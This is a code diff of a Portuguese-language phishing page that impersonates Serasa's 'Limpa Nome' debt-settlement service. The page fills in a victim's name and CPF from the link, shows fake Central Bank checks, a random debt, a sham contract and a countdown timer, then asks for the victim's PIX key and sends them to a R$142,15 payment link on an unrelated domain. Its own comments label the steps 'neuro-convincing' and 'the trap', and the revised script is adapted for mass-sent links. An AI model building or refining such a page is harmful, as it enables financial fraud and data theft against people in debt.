@@ -1,284 +1,80 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Serasa Limpa Nome - Programa de Recuperação de Crédito</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://unpkg.com/lucide@latest"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
-    <style>
-        body { font-family: 'Inter', sans-serif; }
-        .bg-serasa { background-color: #E10075; }
-        .text-serasa { color: #E10075; }
-        .border-serasa { border-color: #E10075; }
-        .hidden-step { display: none !important; }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #E10075;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .shimmer {
-            background: linear-gradient(90deg, #eff6ff 25%, #dbeafe 50%, #eff6ff 75%);
-            background-size: 200% 100%;
-            animation: shimmer 1.5s infinite;
-        }
-        @keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
-    </style>
-</head>
-<body class="bg-slate-50 text-slate-900">
+lucide.createIcons();
 
-    <!-- LOADING SCREEN (NEURO-CONVENCIMENTO) -->
-    <div id="loading" class="fixed inset-0 bg-white z-[100] flex flex-col items-center justify-center gap-4 hidden-step">
-        <div class="loader"></div>
-        <p id="loading-text" class="text-slate-600 font-semibold text-center px-4 animate-pulse">Acessando banco de dados do Banco Central...</p>
-    </div>
-
-    <!-- HEADER -->
-    <header class="bg-serasa text-white py-3 px-4 sticky top-0 z-50 shadow-lg">
-        <div class="max-w-7xl mx-auto flex items-center justify-between">
-            <div class="flex items-center gap-4">
-                <i data-lucide="menu" class="cursor-pointer w-6 h-6"></i>
-                <img src="https://www.serasa.com.br/lno/static-webfiles/common/products/limpa-nome-white.svg" alt="Serasa" class="h-7">
-            </div>
-            <div class="flex items-center gap-2 text-sm font-medium bg-white/10 px-4 py-2 rounded-full cursor-pointer hover:bg-white/20 transition-all">
-                <i data-lucide="user" class="w-4 h-4"></i> <span>Área do Cliente</span>
-            </div>
-        </div>
-    </header>
-
-    <main class="max-w-7xl mx-auto px-4 py-8 md:py-16">
+    // FUNÇÃO DE CAPTURA ULTRA-COMPATÍVEL
+    function getParam(param) {
+        const urlParams = new URLSearchParams(window.location.search);
+        let value = urlParams.get(param);
         
-        <!-- PASSO 1: LANDING (AUTORIDADE E ESCOLHA) -->
-        <div id="step-landing" class="flex flex-col lg:flex-row items-center gap-12">
-            <div class="lg:w-1/2 space-y-8 text-center lg:text-left">
-                <div class="inline-flex items-center gap-2 bg-green-100 text-green-700 px-4 py-2 rounded-full text-xs font-bold uppercase tracking-widest border border-green-200">
-                    <i data-lucide="shield-check" class="w-4 h-4"></i> Convite Exclusivo: Lote de Final de Ano
-                </div>
-                <h1 class="text-4xl lg:text-6xl font-black leading-tight text-slate-900">
-                    Recupere seu <span class="text-serasa">Score</span> e desbloqueie seu crédito em 24h
-                </h1>
-                <p class="text-lg text-slate-600 leading-relaxed">
-                    Olá, <span id="user-name" class="font-bold text-slate-800">Cliente</span>. Você foi selecionado para o <strong>Programa de Recuperação Financeira</strong> devido ao seu perfil de consumo. Para o CPF <span id="user-cpf" class="font-bold text-slate-800">000.000.000-00</span>, liberamos a quitação total de débitos com isenção de juros e multas.
-                </p>
-                <div class="bg-white p-6 rounded-3xl border-2 border-serasa space-y-4 shadow-2xl max-w-xl mx-auto lg:mx-0 relative overflow-hidden">
-                    <div class="absolute top-0 right-0 bg-serasa text-white text-[10px] font-bold px-3 py-1 rounded-bl-lg uppercase">Oficial</div>
-                    <div class="flex items-center gap-3 text-serasa font-bold text-lg">
-                        <i data-lucide="zap" class="w-6 h-6"></i> <span>Benefícios Imediatos:</span>
-                    </div>
-                    <ul class="space-y-3 text-sm text-slate-600">
-                        <li class="flex items-center gap-2"><i data-lucide="check-circle" class="w-4 h-4 text-green-500"></i> Limpeza total do nome em até 5 dias úteis.</li>
-                        <li class="flex items-center gap-2"><i data-lucide="check-circle" class="w-4 h-4 text-green-500"></i> Restauração do Score para nível "Bom/Excelente".</li>
-                        <li class="flex items-center gap-2"><i data-lucide="check-circle" class="w-4 h-4 text-green-500"></i> <strong>Margem de Crédito Pré-Aprovada</strong> liberada após quitação.</li>
-                    </ul>
-                    <button onclick="startAnalysis()" class="w-full bg-serasa text-white font-black py-5 rounded-2xl hover:bg-[#c20066] transition-all flex items-center justify-center gap-2 text-xl shadow-xl uppercase tracking-tight">
-                        Analisar Minha Dívida <i data-lucide="arrow-right" class="w-6 h-6"></i>
-                    </button>
-                </div>
-            </div>
-            <div class="lg:w-1/2 mt-12 lg:mt-0">
-                <img src="https://cdn.builder.io/api/v1/image/assets%2Fb212bb18f00a40869a6cd42f77cbeefc%2F9f794558b8a24871931e873d2bc607a6?quality=70" class="w-full max-w-md mx-auto rounded-3xl shadow-2xl border-8 border-white" alt="Serasa">
-            </div>
-        </div>
+        if (!value) return null;
 
-        <!-- PASSO 2: OFERTA (QUEBRA DE OBJEÇÃO) -->
-        <div id="step-offer" class="hidden-step max-w-3xl mx-auto">
-            <div class="bg-white rounded-3xl shadow-2xl overflow-hidden border border-slate-200">
-                <div class="bg-serasa p-6 text-white text-center relative">
-                    <div class="absolute top-4 right-4 flex items-center gap-2 bg-black/20 px-3 py-1 rounded-full text-xs font-mono">
-                        <i data-lucide="clock" class="w-3 h-3"></i> <span id="timer">14:59</span>
-                    </div>
-                    <h2 class="text-3xl font-black">RESULTADO DA ANÁLISE</h2>
-                    <p class="opacity-90">Sua elegibilidade foi confirmada com sucesso</p>
-                </div>
-                <div class="p-8 space-y-8">
-                    <div class="flex flex-col md:flex-row justify-between items-center p-6 bg-slate-50 rounded-2xl border-2 border-dashed border-slate-300 gap-4">
-                        <div class="text-center md:text-left">
-                            <p class="text-xs text-slate-500 uppercase font-bold">Dívida Total (Com Juros)</p>
-                            <p id="debt-value" class="text-2xl text-slate-400 line-through font-medium">R$ 0,00</p>
-                        </div>
-                        <div class="h-px w-full md:h-12 md:w-px bg-slate-200"></div>
-                        <div class="text-center md:text-right">
-                            <p class="text-xs text-serasa uppercase font-bold">Valor para Quitação Total</p>
-                            <p class="text-4xl font-black text-serasa">R$ 142,15</p>
-                        </div>
-                    </div>
-                    <div class="bg-blue-50 p-6 rounded-2xl border border-blue-100 space-y-4">
-                        <div class="flex items-center gap-3 text-blue-700 font-bold">
-                            <i data-lucide="gift" class="w-6 h-6"></i> <span>BÔNUS DE RECUPERAÇÃO:</span>
-                        </div>
-                        <p class="text-sm text-blue-600 leading-relaxed">
-                            Ao finalizar este pagamento, o sistema ativará automaticamente a <strong>Margem de Crédito Emergencial</strong>. Você terá acesso a um limite de crédito pré-aprovado em sua conta bancária em até 24h após a compensação.
-                        </p>
-                    </div>
-                    <button onclick="goNext('contract')" class="w-full bg-serasa text-white font-black py-5 rounded-2xl hover:bg-[#c20066] transition-all text-xl shadow-lg uppercase tracking-tight">
-                        Aceitar Acordo e Liberar Crédito
-                    </button>
-                </div>
-            </div>
-        </div>
+        // Remove caracteres de placeholders comuns que podem ter sobrado do disparo
+        // Exemplo: se vier {{nome}}, ele limpa para ficar apenas o nome
+        return value.replace(/[{}]/g, '').trim();
+    }
 
-        <!-- PASSO 3: CONTRATO (AUTORIDADE E COMPROMISSO) -->
-        <div id="step-contract" class="hidden-step max-w-3xl mx-auto">
-            <div class="bg-white rounded-3xl shadow-2xl p-8 border border-slate-200">
-                <div class="flex items-center gap-3 mb-6 text-slate-800">
-                    <i data-lucide="file-text" class="text-serasa w-6 h-6"></i> <h2 class="text-2xl font-bold">Termo de Acordo e Liberação de Margem</h2>
-                </div>
-                <div class="bg-slate-50 p-6 rounded-xl text-xs text-slate-600 leading-relaxed h-80 overflow-y-scroll border border-slate-200 mb-8 font-mono">
-                    <p class="mb-4 font-bold text-slate-800 text-center uppercase">Contrato de Regularização Financeira nº 882.104/2024</p>
-                    <p class="mb-4"><strong>CLÁUSULA 1ª:</strong> O beneficiário <span class="contract-name font-bold"></span>, CPF <span class="contract-cpf font-bold"></span>, concorda com a quitação total de seus débitos mediante o pagamento único de R$ 142,15.</p>
-                    <p class="mb-4"><strong>CLÁUSULA 2ª:</strong> A Serasa compromete-se a efetuar a baixa de todas as restrições nos órgãos de proteção ao crédito em até 5 dias úteis.</p>
-                    <p class="mb-4"><strong>CLÁUSULA 3ª:</strong> Fica estabelecido que, após a compensação do pagamento, o sistema de Score será atualizado para a categoria "Crédito Ativo", liberando a margem de crédito pré-aprovada vinculada ao CPF do beneficiário.</p>
-                    <p class="mb-4"><strong>CLÁUSULA 4ª:</strong> O beneficiário declara estar ciente de que a liberação da margem de crédito ocorre em até 24 horas úteis após a confirmação do pagamento via PIX.</p>
-                    <p class="mb-4"><strong>CLÁUSULA 5ª:</strong> Este acordo é irrevogável e irretratável, servindo como comprovante de quitação total perante as instituições credoras.</p>
-                </div>
-                <div class="space-y-6">
-                    <div class="flex items-center gap-3 p-4 bg-blue-50 rounded-xl border border-blue-100 text-blue-700 text-sm">
-                        <i data-lucide="lock" class="w-4 h-4"></i> <span>Assinatura Digital Criptografada via SSL (Certificado A1)</span>
-                    </div>
-                    <div class="flex items-center gap-3">
-                        <input type="checkbox" id="termos" class="w-5 h-5 accent-serasa" />
-                        <label for="termos" class="text-sm text-slate-600">Eu li, concordo e assino digitalmente os termos de quitação e liberação de crédito.</label>
-                    </div>
-                    <button onclick="goNext('data')" class="w-full bg-serasa text-white font-black py-4 rounded-2xl hover:bg-[#c20066] transition-all text-lg shadow-lg uppercase">
-                        Assinar Contrato e Prosseguir
-                    </button>
-                </div>
-            </div>
-        </div>
+    // Captura os dados
+    const name = getParam('nome') || 'Cliente';
+    const cpf = getParam('cpf') || '000.000.000-00';
+    const divida = getParam('divida') || (Math.random() * (7000 - 1000) + 1000).toFixed(2).replace('.', ',');
 
-        <!-- PASSO 4: DADOS PARA RECEBIMENTO (A ARMADILHA) -->
-        <div id="step-data" class="hidden-step max-w-xl mx-auto">
-            <div class="bg-white rounded-3xl shadow-2xl p-8 border border-slate-200 text-center space-y-6">
-                <div class="inline-flex p-3 bg-blue-100 text-blue-600 rounded-full">
-                    <i data-lucide="banknote" class="w-8 h-8"></i>
-                </div>
-                <h2 class="text-2xl font-black text-slate-800">Configurar Recebimento</h2>
-                <p class="text-slate-500">Para que a <strong>Margem de Crédito</strong> e o estorno de juros sejam depositados, informe sua chave PIX.</p>
-                
-                <div class="text-left space-y-4">
-                    <div>
-                        <label class="text-xs font-bold text-slate-500 uppercase ml-1">Tipo de Chave PIX</label>
-                        <select id="pix-type" class="w-full p-3 border rounded-xl outline-none focus:ring-2 ring-serasa bg-slate-50">
-                            <option>CPF</option>
-                            <option>E-mail</option>
-                            <option>Telefone</option>
-                            <option>Chave Aleatória</option>
-                        </select>
-                    </div>
-                    <div>
-                        <label class="text-xs font-bold text-slate-500 uppercase ml-1">Chave PIX para Depósito</label>
-                        <input type="text" id="pix-key" placeholder="Digite sua chave aqui" class="w-full p-3 border rounded-xl outline-none focus:ring-2 ring-serasa bg-slate-50">
-                    </div>
-                </div>
-                <button onclick="goNext('checkout')" class="w-full bg-serasa text-white font-black py-4 rounded-2xl hover:bg-[#c20066] transition-all text-lg shadow-lg uppercase">
-                    Confirmar Dados e Gerar Pagamento
-                </button>
-            </div>
-        </div>
+    // Injeta nos elementos da página
+    document.getElementById('user-name').innerText = name;
+    document.getElementById('user-cpf').innerText = cpf;
+    
+    // Atualiza todas as instâncias no contrato
+    document.querySelectorAll('.contract-name').forEach(el => el.innerText = name);
+    document.querySelectorAll('.contract-cpf').forEach(el => el.innerText = cpf);
 
-        <!-- PASSO 5: CHECKOUT FINAL -->
-        <div id="step-checkout" class="hidden-step max-w-xl mx-auto">
-            <div class="bg-white rounded-3xl shadow-2xl overflow-hidden border border-slate-200 p-8 text-center space-y-6">
-                <div class="inline-flex p-3 bg-green-100 text-green-600 rounded-full">
-                    <i data-lucide="check-circle" class="w-8 h-8"></i>
-                </div>
-                <h2 class="text-3xl font-black text-slate-800">Tudo Pronto!</h2>
-                <p class="text-slate-500">Seu acordo foi gerado. Pague agora para liberar seu nome e a margem de crédito em 24h.</p>
-                
-                <!-- LINK DE PAGAMENTO -->
-                <a href="https://pay.sharkautomacoes.com/5e68a971" class="group flex items-center justify-between p-6 border-2 border-slate-200 rounded-2xl cursor-pointer hover:border-serasa transition-all bg-white shadow-sm">
-                    <div class="flex items-center gap-4">
-                        <div class="p-3 bg-slate-100 rounded-lg group-hover:bg-pink-50 transition-colors">
-                            <i data-lucide="credit-card" class="text-slate-600 group-hover:text-serasa"></i>
-                        </div>
-                        <div class="text-left">
-                            <p class="font-black text-slate-800 text-lg">PIX (Aprovação Instantânea)</p>
-                            <p class="text-sm text-slate-500">Valor: R$ 142,15</p>
-                        </div>
-                    </div>
-                    <i data-lucide="arrow-right" class="text-slate-300 group-hover:text-serasa"></i>
-                </a>
+    function startAnalysis() {
+        document.getElementById('loading').classList.remove('hidden-step');
+        const texts = [
+            "Acessando banco de dados do Banco Central...",
+            "Verificando pendências no CPF " + cpf + "...",
+            "Calculando isenção de juros e multas...",
+            "Verificando elegibilidade de Margem de Crédito...",
+            "Gerando proposta de quitação..."
+        ];
+        
+        let i = 0;
+        const interval = setInterval(() => {
+            document.getElementById('loading-text').innerText = texts[i];
+            i++;
+            if(i >= texts.length) {
+                clearInterval(interval);
+                finishAnalysis();
+            }
+        }, 1500);
+    }
 
-                <div class="p-4 bg-red-50 rounded-xl border border-red-100 flex gap-3 text-xs text-red-700">
-                    <i data-lucide="alert-circle" class="shrink-0 w-5 h-5"></i>
-                    <span class="font-medium">URGENTE: O código PIX expira em 30 minutos. Se não for pago, a oferta e a margem de crédito serão canceladas.</span>
-                </div>
-            </div>
-        </div>
-    </main>
+    function finishAnalysis() {
+        const formattedDebt = divida.includes(',') ? `R$ ${divida}` : new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(parseFloat(divida.replace(',', '.')));
+        document.getElementById('debt-value').innerText = formattedDebt;
+        
+        document.getElementById('loading').classList.add('hidden-step');
+        document.getElementById('step-landing').classList.add('hidden-step');
+        document.getElementById('step-offer').classList.remove('hidden-step');
+        startTimer();
+    }
 
-    <script>
-        lucide.createIcons();
-
-        const params = new URLSearchParams(window.location.search);
-        const name = params.get('nome') || 'Cliente';
-        const cpf = params.get('cpf') || '000.000.000-00';
-
-        document.getElementById('user-name').innerText = name;
-        document.getElementById('user-cpf').innerText = cpf;
-        document.querySelectorAll('.contract-name').forEach(el => el.innerText = name);
-        document.querySelectorAll('.contract-cpf').forEach(el => el.innerText = cpf);
-
-        function startAnalysis() {
-            document.getElementById('loading').classList.remove('hidden-step');
-            const texts = [
-                "Acessando banco de dados do Banco Central...",
-                "Verificando pendências no CPF " + cpf + "...",
-                "Calculando isenção de juros e multas...",
-                "Verificando elegibilidade de Margem de Crédito...",
-                "Gerando proposta de quitação..."
-            ];
-            
-            let i = 0;
-            const interval = setInterval(() => {
-                document.getElementById('loading-text').innerText = texts[i];
-                i++;
-                if(i >= texts.length) {
-                    clearInterval(interval);
-                    finishAnalysis();
-                }
-            }, 1500);
-        }
-
-        function finishAnalysis() {
-            const randomDebt = (Math.random() * (18000 - 5000) + 5000).toLocaleString('pt-BR', {
-                style: 'currency', currency: 'BRL'
-            });
-            document.getElementById('debt-value').innerText = randomDebt;
-            
+    function goNext(stepId) {
+        document.getElementById('loading').classList.remove('hidden-step');
+        document.getElementById('loading-text').innerText = "Processando solicitação...";
+        setTimeout(() => {
+            document.querySelectorAll('[id^="step-"]').forEach(div => div.classList.add('hidden-step'));
+            document.getElementById('step-' + stepId).classList.remove('hidden-step');
             document.getElementById('loading').classList.add('hidden-step');
-            document.getElementById('step-landing').classList.add('hidden-step');
-            document.getElementById('step-offer').classList.remove('hidden-step');
-            startTimer();
-        }
+            window.scrollTo(0, 0);
+        }, 1000);
+    }
 
-        function goNext(stepId) {
-            document.getElementById('loading').classList.remove('hidden-step');
-            document.getElementById('loading-text').innerText = "Processando solicitação...";
-            setTimeout(() => {
-                document.querySelectorAll('[id^="step-"]').forEach(div => div.classList.add('hidden-step'));
-                document.getElementById('step-' + stepId).classList.remove('hidden-step');
-                document.getElementById('loading').classList.add('hidden-step');
-                window.scrollTo(0, 0);
-            }, 1000);
-        }
-
-        function startTimer() {
-            let timeLeft = 899;
-            const timerElement = document.getElementById('timer');
-            setInterval(() => {
-                if (timeLeft <= 0) return;
-                timeLeft--;
-                const mins = Math.floor(timeLeft / 60);
-                const secs = timeLeft % 60;
-                timerElement.innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
-            }, 1000);
-        }
-    </script>
-</body>
-</html>
+    function startTimer() {
+        let timeLeft = 899;
+        const timerElement = document.getElementById('timer');
+        setInterval(() => {
+            if (timeLeft <= 0) return;
+            timeLeft--;
+            const mins = Math.floor(timeLeft / 60);
+            const secs = timeLeft % 60;
+            timerElement.innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+        }, 1000);
+    }
